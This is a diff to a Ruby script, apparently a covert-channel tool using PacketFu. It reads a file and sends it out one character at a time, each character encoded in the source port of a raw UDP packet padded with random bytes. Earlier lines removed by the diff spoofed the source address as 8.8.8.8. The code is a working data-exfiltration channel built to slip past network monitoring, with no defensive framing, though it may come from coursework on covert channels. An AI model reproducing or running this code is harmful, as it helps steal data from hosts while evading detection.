@@ -78,6 +78,20 @@ def makePayload
     Array.new(rand(256)) { rand(256) }.pack('c*')
 end
 
+def sendData(data)
+    pkt = PacketFu::UDPPacket.new(:config => @config, :flavor => "Linux")
+
+    #pkt.udp_src  = rand(0xffff-35535) + 35535 # random port between 30k and 65535
+    pkt.udp_dst  = @port
+    pkt.ip_daddr = @ip
+    pkt::udp_header.body = makePayload # randomly sized binary data
+
+    pkt.udp_src = 35535 + encrypt(data).bytes[0]
+    pkt.recalc # MUST RECALC CHECKSUM or receiver will throw out
+
+    pkt.to_w # send the packet
+end
+
 ## Main
 
 # check for root
@@ -91,39 +105,27 @@ if ARGV.count != 3
     exitReason(USAGE)
 end
 
-ip = resolveAddress(ARGV[0])
-port = ARGV[1].chomp.to_i
+@ip = resolveAddress(ARGV[0])
+@port = ARGV[1].chomp.to_i
 filename = ARGV[2]
 
 ARGV.clear # clear for STDIN, if applicable
 
-if !IPAddress::valid?(ip) # check valid dst address
+if !IPAddress::valid?(@ip) # check valid dst address
     exitReason(ERR_IP)
-elsif !validPort(port) # check valid port
+elsif !validPort(@port) # check valid port
     exitReason(ERR_PORT)
 elsif !File.file?(filename) # check file exists
     exitReason(ERR_FILE)
 end
 
-config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
-pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
-#pkt.udp_src  = rand(0xffff-35535) + 35535 # random port between 30k and 65535
-pkt.udp_dst  = port
-pkt.ip_saddr = "8.8.8.8"
-pkt.ip_daddr = ip
+@config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
 
-pkt::udp_header.body = makePayload
-puts pkt::udp_header.body
-
-
-pkt.udp_src = 35535
-pkt.recalc # MUST RECALC CHECKSUM or receiver will throw out
-
-pkt.to_w
-
-c = encrypt("v")
-puts c.bytes
-puts 35535 + c.bytes[0]
-puts encrypt(c)
+File.open(filename, 'r') do |f|
+    f.each_char do |c|
+        sendData(c)
+        sleep 1
+    end
+end
 
 
